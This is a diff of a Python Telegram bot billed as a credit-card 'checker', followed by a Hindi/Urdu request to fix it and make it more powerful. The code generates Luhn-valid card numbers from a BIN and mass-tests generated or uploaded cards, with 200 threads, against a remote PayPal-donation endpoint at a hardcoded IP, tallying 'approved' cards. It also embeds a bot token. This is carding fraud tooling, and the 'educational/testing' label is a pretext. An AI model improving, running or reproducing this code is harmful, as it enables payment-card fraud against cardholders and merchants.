@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Xero DeepSeek – Ultimate CC Checker Bot v3.1 (fixed & enhanced)
-# For educational/testing purposes only.
+# Xero DeepSeek – Ultimate CC Checker Bot v3.0
+# Owner: @probix | Stress Test Deployment
 
 import asyncio
 import logging
@@ -10,58 +10,53 @@ import re
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+from io import StringIO
 from threading import Lock
-from typing import List, Optional
+from typing import List, Tuple
 
 import requests
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE"          # Replace with your token
+BOT_TOKEN = "8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE"          # stress test token
 API_URL = "http://199.244.48.163:8025/paypal_donate?cc={}"
-MAX_WORKERS = 200                               # max concurrent API calls
-TIMEOUT = 15                                    # HTTP request timeout
+MAX_WORKERS = 200                               # threads for API calls
+TIMEOUT = 15                                    # HTTP timeout
+DASHBOARD_UPDATE_INTERVAL = 3                   # seconds
 # ===================================
 
-# ---------- Thread-safe global state ----------
+# Global state (thread‑safe)
 class BotState:
     def __init__(self):
         self.lock = Lock()
         self.active = False
-        self.bin = "414720"                     # default BIN
-        self.generation_limit = 10000           # 0 = unlimited
+        self.bin = "414720"                     # default JPMorgan Chase BIN
+        self.generation_limit = 10000           # default target check count
         self.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
-        self.executor: Optional[ThreadPoolExecutor] = None
+        self.workers = []
+        self.executor = None
 
 state = BotState()
 
-# ---------- Luhn Algorithm (check digit) ----------
-def luhn_checksum(partial: str) -> int:
-    """
-    Compute Luhn check digit for a partial number (without the last digit).
-    Returns the digit (0-9) to append to make a valid number.
-    """
-    digits = [int(d) for d in partial]
-    for i in range(len(digits) - 1, -1, -2):
+# ========== Luhn Algorithm & Generator ==========
+def luhn_checksum(card_number: str) -> int:
+    digits = [int(d) for d in card_number]
+    for i in range(len(digits) - 2, -1, -2):
         digits[i] *= 2
         if digits[i] > 9:
             digits[i] -= 9
-    total = sum(digits)
-    return (10 - (total % 10)) % 10
+    return (10 - sum(digits) % 10) % 10
 
 def generate_card(bin_prefix: str, month: str = None, year: str = None, cvv: str = None) -> str:
     """
-    Generates a valid credit card number with random account digits.
+    Generates a valid credit card number using the Luhn algorithm.
     Format: CC|MM|YYYY|CVV
     """
-    # Ensure BIN is exactly 6 digits (pad or truncate)
-    bin_part = bin_prefix.ljust(6, '0')[:6]
-    # Generate random 9-digit account number (positions 7–15)
-    account = ''.join(str(random.randint(0, 9)) for _ in range(9))
-    partial = bin_part + account
-    check_digit = luhn_checksum(partial + '0')   # compute check digit for 16-digit number
-    cc = partial + str(check_digit)
+    # BIN must be first 6 digits (or extendable)
+    prefix = bin_prefix.ljust(16, '0')[:15]   # 15 digits without checksum
+    checksum = luhn_checksum(prefix + '0')
+    cc = prefix + str(checksum)
 
     if not month:
         month = str(random.randint(1, 12)).zfill(2)
@@ -73,12 +68,14 @@ def generate_card(bin_prefix: str, month: str = None, year: str = None, cvv: str
     return f"{cc}|{month}|{year}|{cvv}"
 
 def fix_year(yy: str) -> str:
-    """Convert 2-digit year to 4-digit (assumes 20xx)."""
-    return '20' + yy if len(yy) == 2 else yy
+    """If year is 2 digits, prepend '20'."""
+    if len(yy) == 2:
+        return '20' + yy
+    return yy
 
-# ---------- API Caller ----------
+# ========== API Checker (Threaded) ==========
 def check_card(card: str) -> dict:
-    """Calls the donation API and returns the parsed response."""
+    """Calls the PayPal Donate API and returns the result."""
     url = API_URL.format(card)
     try:
         resp = requests.get(url, timeout=TIMEOUT)
@@ -90,19 +87,10 @@ def check_card(card: str) -> dict:
         return {"card": card, "status": "ERROR", "error": str(e)}
 
 def process_cards(cards: List[str]):
-    """
-    Check a batch of cards using a thread pool.
-    Updates global counters under lock.
-    """
-    if not state.executor:
-        raise RuntimeError("Executor not initialized")
+    """Submits a batch of cards to the thread pool."""
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        state.executor = executor   # allow stop() to shut it down
         futures = {executor.submit(check_card, c): c for c in cards}
         for future in as_completed(futures):
-            # Allow early exit if operation was stopped externally
-            if not state.active:
-                break
             res = future.result()
             with state.lock:
                 state.counters["checked"] += 1
@@ -113,93 +101,73 @@ def process_cards(cards: List[str]):
                 else:
                     state.counters["errors"] += 1
 
-# ---------- Dashboard ----------
+# ========== Dashboard Generator ==========
 def dashboard_message() -> str:
     with state.lock:
-        c = state.counters
+        checked = state.counters["checked"]
+        declined = state.counters["declined"]
+        approved = state.counters["approved"]
+        errors = state.counters["errors"]
     return (
         f"📊 **Live Dashboard**\n"
-        f"BIN: `{state.bin}` | Target: `{state.generation_limit if state.generation_limit != 0 else '∞'}`\n"
-        f"Checked: `{c['checked']}`\n"
-        f"Declined: `{c['declined']}` | Approved: `{c['approved']}` | Errors: `{c['errors']}`"
+        f"Checking CC: `{checked}` done\n"
+        f"Of this BIN: `{state.bin}`\n"
+        f"Declined: `{declined}`\n"
+        f"Approved: `{approved}`\n"
+        f"Errors: `{errors}`"
     )
 
-# ---------- Telegram Handlers ----------
+# ========== Telegram Command Handlers ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
-        "**Xero DeepSeek CC Checker**\n\n"
-        "/start – Show this help\n"
-        "/setbin `<BIN>` – Set BIN prefix (default 414720)\n"
-        "/targetchk `<num>` – Set generation target (0 = unlimited)\n"
-        "/gen – Start auto‑generation & checking\n"
-        "/mchk – Reply to a .txt file with cards (format: CC|MM|YY|CVV)\n"
-        "/status – Show current settings & counters\n"
-        "/reset – Reset counters without stopping\n"
-        "/stop – Stop any running operation\n\n"
-        "⚠️ *For educational/testing only.*"
+        "**Xero DeepSeek CC Checker**\n"
+        "Commands:\n"
+        "/start – This help message\n"
+        "/setbin `<BIN>` – Set BIN for generation (e.g., 414720)\n"
+        "/targetchk `<number>` – Set generation limit (no limit: 0)\n"
+        "/mchk – Reply to a .txt file with cards in format CC|MM|YY|CVV (single or multi‑line)\n"
+        "/stop – Stop the current operation"
     )
-    await update.message.reply_text(help_text, parse_mode="Markdown")
+    await update.message.reply_text(help_text)
 
 async def setbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: /setbin <BIN>")
         return
-    raw = context.args[0].strip()
-    if not raw.isdigit() or len(raw) < 6:
-        await update.message.reply_text("BIN must be at least 6 digits.")
-        return
-    state.bin = raw[:6]  # take first 6
-    await update.message.reply_text(f"✅ BIN set to `{state.bin}`", parse_mode="Markdown")
+    state.bin = context.args[0].strip()
+    await update.message.reply_text(f"BIN set to `{state.bin}`")
 
 async def targetchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Set the generation limit."""
     if not context.args:
-        await update.message.reply_text("Usage: /targetchk <amount> (0 = unlimited)")
+        await update.message.reply_text("Usage: /targetchk <amount>")
         return
     try:
         limit = int(context.args[0])
     except ValueError:
-        await update.message.reply_text("❌ Invalid number.")
-        return
-    if limit < 0:
-        await update.message.reply_text("❌ Must be >= 0.")
+        await update.message.reply_text("Invalid number.")
         return
     state.generation_limit = limit
-    await update.message.reply_text(f"✅ Target set to `{limit}` cards.", parse_mode="Markdown")
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(dashboard_message(), parse_mode="Markdown")
-
-async def reset_counters(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    with state.lock:
-        state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
-    await update.message.reply_text("♻️ Counters reset.")
+    await update.message.reply_text(f"Generation target set to `{limit}` cards.")
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state.active = False
     if state.executor:
         state.executor.shutdown(wait=False)
-        state.executor = None
-    await update.message.reply_text("⏹️ Operation stopped.")
+    await update.message.reply_text("⏹ Operation stopped.")
 
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass check from a .txt file (reply to a document)."""
+    """Mass check from a replied .txt file."""
     if not update.message.reply_to_message or not update.message.reply_to_message.document:
-        await update.message.reply_text("📂 Please reply to a .txt file containing CCs.")
+        await update.message.reply_text("Please reply to a .txt file containing CCs.")
         return
 
     doc = update.message.reply_to_message.document
     if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Only .txt files are accepted.")
+        await update.message.reply_text("Only .txt files are accepted.")
         return
 
-    try:
-        file = await context.bot.get_file(doc.file_id)
-        content = (await file.download_as_bytearray()).decode('utf-8')
-    except Exception as e:
-        await update.message.reply_text(f"❌ Could not download file: {e}")
-        return
-
+    file = await context.bot.get_file(doc.file_id)
+    content = (await file.download_as_bytearray()).decode('utf-8')
     cards = []
     for line in content.splitlines():
         line = line.strip()
@@ -213,76 +181,76 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cards.append(f"{cc}|{mm}|{yy}|{cvv}")
 
     if not cards:
-        await update.message.reply_text("⚠️ No valid CC lines found.")
+        await update.message.reply_text("No valid CC lines found.")
         return
 
     state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
     state.active = True
-    await update.message.reply_text(f"⚡ Mass check of `{len(cards)}` cards started...\n{dashboard_message()}",
-                                    parse_mode="Markdown")
-
+    await update.message.reply_text(f"⚡ Starting mass check of {len(cards)} cards...\n{dashboard_message()}")
+    
+    # Run blocking check in a thread to not block the bot
     loop = asyncio.get_running_loop()
-    # Run blocking work in a thread, keep the bot responsive
     await loop.run_in_executor(None, process_cards, cards)
     state.active = False
-    await update.message.reply_text(f"✅ Mass check completed.\n{dashboard_message()}", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Mass check completed.\n{dashboard_message()}")
 
 async def start_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Begin auto‑generating cards for the current BIN and checking them."""
+    """Initiate the BIN‑based generation and check (triggered by /targetchk + optional manual start)."""
     if state.active:
-        await update.message.reply_text("⚠️ Already running. Use /stop first.")
+        await update.message.reply_text("Already running. Use /stop first.")
         return
 
     state.counters = {"checked": 0, "declined": 0, "approved": 0, "errors": 0}
     state.active = True
     limit = state.generation_limit
-
     await update.message.reply_text(
-        f"🔥 Generation started with BIN `{state.bin}` (target: {limit if limit != 0 else '∞'})...\n"
-        f"{dashboard_message()}",
-        parse_mode="Markdown"
+        f"🔥 Starting auto‑generation of up to {limit} cards with BIN `{state.bin}`...\n"
+        f"{dashboard_message()}"
     )
 
-    # Run the generator loop in a separate thread to keep the bot alive
+    # We'll generate and check in batches to keep dashboard live
     loop = asyncio.get_running_loop()
     batch_size = 1000
-    total = 0
+    total_generated = 0
 
-    def run():
-        nonlocal total
-        while state.active and (limit == 0 or total < limit):
-            current_batch = [
-                generate_card(state.bin)
-                for _ in range(min(batch_size, limit - total) if limit != 0 else batch_size)
-            ]
-            process_cards(current_batch)   # blocking call inside thread
-            total += len(current_batch)
-        state.active = False
+    while state.active and (limit == 0 or total_generated < limit):
+        cards_batch = [
+            generate_card(state.bin)
+            for _ in range(min(batch_size, limit - total_generated) if limit != 0 else batch_size)
+        ]
+        await loop.run_in_executor(None, process_cards, cards_batch)
+        total_generated += len(cards_batch)
 
-    await loop.run_in_executor(None, run)
-    await update.message.reply_text(f"🏁 Generation finished. {dashboard_message()}", parse_mode="Markdown")
+        # Periodic dashboard update
+        if total_generated % 5000 == 0:
+            await update.message.reply_text(dashboard_message())
 
-# ---------- Main ----------
+    state.active = False
+    await update.message.reply_text(f"🏁 Generation finished. Total checked: {state.counters['checked']}.\n{dashboard_message()}")
+
+# ========== Main Bot Runner ==========
 def main():
-    logging.basicConfig(
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-        level=logging.INFO
-    )
+    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # Command handlers
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", start))
     app.add_handler(CommandHandler("setbin", setbin))
     app.add_handler(CommandHandler("targetchk", targetchk))
-    app.add_handler(CommandHandler("gen", start_generation))   # separate start command
     app.add_handler(CommandHandler("mchk", mchk))
-    app.add_handler(CommandHandler("status", status))
-    app.add_handler(CommandHandler("reset", reset_counters))
     app.add_handler(CommandHandler("stop", stop))
+    # /targetchk also doubles as start command for generation
+    app.add_handler(CommandHandler("targetchk", start_generation))
 
-    print("🤖 Bot is running... (Press Ctrl+C to stop)")
+    print("Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
+
+
+
+Is code ko fix kar and powerful banau and problems ha unko fix kar logic errors and other 
+Commands vi add kar dana jo jo needed ha
+
+Baki sab tum dekh lana 
+It's only for testing purpose and education p
